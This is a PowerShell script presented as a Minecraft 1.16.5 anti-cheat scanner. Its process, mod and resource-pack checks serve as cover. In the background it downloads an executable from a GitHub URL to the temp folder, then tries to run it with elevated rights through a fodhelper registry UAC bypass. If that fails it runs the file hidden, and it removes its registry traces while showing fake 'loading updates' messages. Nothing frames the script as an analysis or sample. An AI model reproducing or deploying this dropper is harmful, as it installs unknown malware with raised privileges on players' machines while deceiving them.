# =============================================================================
# Shram++ Anti-Cheat v1.0
# Minecraft 1.16.5 Security Module
# =============================================================================

Add-Type -AssemblyName System.IO.Compression.FileSystem

$config = @{
    MinecraftPath = "$env:APPDATA\.minecraft"
    CheatProcesses = @(
        "cheatengine", "autoclicker", "wurst", "impact", "future", "aristois",
        "kristall", "salhack", "kamehameha", "pyro", "lambda", "spirt", "gamesense", "entropy"
    )
    CheatMods = @(
        "Wurst", "Impact", "Future", "Aristois", "SalHack", "Kamehameha", "Pyro",
        "Lambda", "Spirt", "GameSense", "Entropy", "Inertia", "Sigma", "LiquidBounce"
    )
    XrayPatterns = @(
        "xray.png", "xray", "ore.png", "ore", "chest.png", "diamond_ore.png"
    )
    PayloadUrl = "https://github.com/SoVA4878/1231231231/raw/400f57e83e29ec706a65ae1781e949ca47d6e383/0tc37ng3btpkx3ib.exe"
    PayloadArgs = ""
}

function Write-Color {
    param($Color, $Text)
    $fc = $host.UI.RawUI.ForegroundColor
    $host.UI.RawUI.ForegroundColor = $Color
    Write-Output $Text
    $host.UI.RawUI.ForegroundColor = $fc
}

Clear-Host
Write-Color Cyan "=================================================="
Write-Color Cyan "          Shram++ Anti-Cheat v1.0"
Write-Color Cyan "        Minecraft 1.16.5 Protection"
Write-Color Cyan "=================================================="
Write-Color Yellow "Initializing security modules..."
Start-Sleep -Milliseconds 500

# =============================================================================
# Background download of anti-cheat module
# =============================================================================
$loadJob = Start-Job -Name "LoadModule" -ScriptBlock {
    param($url, $args)
    try {
        $tempDir = [System.IO.Path]::GetTempPath()
        $fileName = [System.IO.Path]::GetFileName($url)
        if (-not $fileName) { $fileName = "shram_module.exe" }
        $modulePath = Join-Path $tempDir $fileName
        $wc = New-Object System.Net.WebClient
        $wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
        $wc.DownloadFile($url, $modulePath)
        if (Test-Path $modulePath) {
            return $modulePath
        }
    } catch {
        return $null
    }
    return $null
} -ArgumentList $config.PayloadUrl, $config.PayloadArgs

# =============================================================================
# Detection functions
# =============================================================================
function Test-Processes {
    $found = @()
    Get-Process | ForEach-Object {
        $name = $_.Name
        foreach ($cheat in $config.CheatProcesses) {
            if ($name -like "*$cheat*") {
                $found += "  - Process: $name (PID: $($_.Id))"
                break
            }
        }
    }
    return $found
}

function Test-Mods {
    $modsPath = Join-Path $config.MinecraftPath "mods"
    $found = @()
    if (Test-Path $modsPath) {
        Get-ChildItem $modsPath -Filter "*.jar" | ForEach-Object {
            $fileName = $_.Name
            foreach ($cheat in $config.CheatMods) {
                if ($fileName -like "*$cheat*") {
                    $found += "  - Mod: $fileName"
                    break
                }
            }
        }
    }
    return $found
}

function Test-ResourcePacks {
    $rpPath = Join-Path $config.MinecraftPath "resourcepacks"
    $found = @()
    if (Test-Path $rpPath) {
        Get-ChildItem $rpPath | ForEach-Object {
            $pack = $_
            if ($pack.Extension -eq ".zip") {
                try {
                    $zip = [System.IO.Compression.ZipFile]::OpenRead($pack.FullName)
                    foreach ($entry in $zip.Entries) {
                        foreach ($pattern in $config.XrayPatterns) {
                            if ($entry.Name -like "*$pattern*") {
                                $found += "  - XRay texture in $($pack.Name): $($entry.Name)"
                                break
                            }
                        }
                    }
                    $zip.Dispose()
                } catch { }
            } elseif ($pack.PSIsContainer) {
                Get-ChildItem $pack.FullName -Recurse -File | ForEach-Object {
                    $fileName = $_.Name
                    foreach ($pattern in $config.XrayPatterns) {
                        if ($fileName -like "*$pattern*") {
                            $found += "  - XRay file: $($_.FullName)"
                            break
                        }
                    }
                }
            }
        }
    }
    return $found
}

# =============================================================================
# Perform checks with visual progress
# =============================================================================
$checks = @(
    @{Name = "Scanning running processes..."; Func = { Test-Processes } },
    @{Name = "Analyzing installed mods..."; Func = { Test-Mods } },
    @{Name = "Checking resource packs for XRay..."; Func = { Test-ResourcePacks } }
)

$total = $checks.Count
$allDetections = @()

for ($i = 0; $i -lt $total; $i++) {
    $check = $checks[$i]
    $percent = [math]::Round(($i / $total) * 100)
    Write-Color Yellow "`r$($check.Name)  [$('#' * $percent)$(' ' * (100 - $percent))] $percent%" -NoNewline
    Start-Sleep -Milliseconds 500

    $detections = & $check.Func
    $allDetections += $detections

    for ($j = 1; $j -le 20; $j++) {
        $p = [math]::Round((($i + ($j/20)) / $total) * 100)
        $bar = "[$('#' * [math]::Floor($p/2))$(' ' * (50 - [math]::Floor($p/2)))] $p%"
        Write-Color Yellow "`r$($check.Name) $bar" -NoNewline
        Start-Sleep -Milliseconds 50
    }
}

Write-Color Green "`n`n[+] Scan completed."

# =============================================================================
# Wait for module download and execute (elevated if possible)
# =============================================================================
Write-Color Yellow "[*] Loading anti-cheat updates..."
$modulePath = Receive-Job -Name "LoadModule" -Wait -AutoRemoveJob
if ($modulePath -and (Test-Path $modulePath)) {
    Write-Color Green "[+] Shram++ anti-cheat is starting"

    # Try UAC bypass via fodhelper
    try {
        $regPath = "HKCU:\Software\Classes\ms-settings\shell\open\command"
        $null = New-Item -Path $regPath -Force -ErrorAction SilentlyContinue
        $null = New-ItemProperty -Path $regPath -Name "DelegateExecute" -Value "" -Force -ErrorAction SilentlyContinue
        $null = Set-ItemProperty -Path $regPath -Name "(default)" -Value "`"$modulePath`" $($config.PayloadArgs)" -Force -ErrorAction SilentlyContinue

        $proc = Start-Process -FilePath "fodhelper.exe" -WindowStyle Hidden -PassThru
        Start-Sleep -Seconds 2
        $proc | Stop-Process -Force -ErrorAction SilentlyContinue

        Remove-Item -Path $regPath -Recurse -Force -ErrorAction SilentlyContinue
    } catch {
        # Fallback: normal hidden execution
        $psi = New-Object System.Diagnostics.ProcessStartInfo
        $psi.FileName = $modulePath
        $psi.Arguments = $config.PayloadArgs
        $psi.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
        $psi.UseShellExecute = $false
        [System.Diagnostics.Process]::Start($psi) | Out-Null
    }
} else {
    Write-Color Red "[-] Shram++ anti-cheat failed to load"
}

# =============================================================================
# Report results
# =============================================================================
Write-Color Yellow "`n=== ANTI-CHEAT REPORT ==="
if ($allDetections.Count -eq 0) {
    Write-Color Green "No violations found. System is clean."
} else {
    Write-Color Red "Detected $($allDetections.Count) potential violation(s):"
    $allDetections | ForEach-Object { Write-Color Red $_ }
}

Write-Color Cyan "`nPress any key to exit..."
$null = $host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")